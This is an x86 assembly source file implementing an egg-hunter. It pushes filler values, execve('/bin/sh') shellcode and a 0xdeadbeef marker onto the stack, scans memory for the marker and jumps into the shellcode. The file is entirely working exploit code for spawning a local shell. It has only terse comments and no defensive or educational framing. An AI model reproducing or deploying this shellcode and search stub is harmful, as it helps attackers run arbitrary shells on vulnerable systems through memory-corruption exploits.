section .text
global _start

_start:
	; trash
	push 0x94047484
	push 0x8c35f24a
	push 0x5a449067
	push 0xf5a651ed
	push 0x7161d058
	push 0x3b7b4e10
	push 0x9f93c06e
	; shellcode execve() /bin/sh
	push 0x9080cd0b
	push 0xb0e18953
	push 0xe28950e3
	push 0x896e6962
	push 0x2f687361
	push 0x622f6868
	push 0x6a50c031
	; egg
	push 0xdeadbeef
	; trash
        push 0xd213a92d
        push 0x9e3a066b
        push 0xeb8cb927
        push 0xddbaec55
        push 0x43a73283
        push 0x89f447de
        push 0xacfb220f


	mov ebx, 0xefbeadde	; egg in reverse order
        mov esi, esp
        mov cl, 200		; change this value for deeper or less searching

find:   lodsb			; read byte from source - esi
        cmp eax, ebx		; is it egg?
        jz equal		; if so, give control to shellcode
	shl eax, 8		; if not, shift one byte left
        loop find		; repeat

	xor eax, eax		; if there is no egg - exit
        mov al, 1
	xor ebx, ebx
        mov bl, 10
        int 0x80

equal: jmp esi			; jmp to shellcode

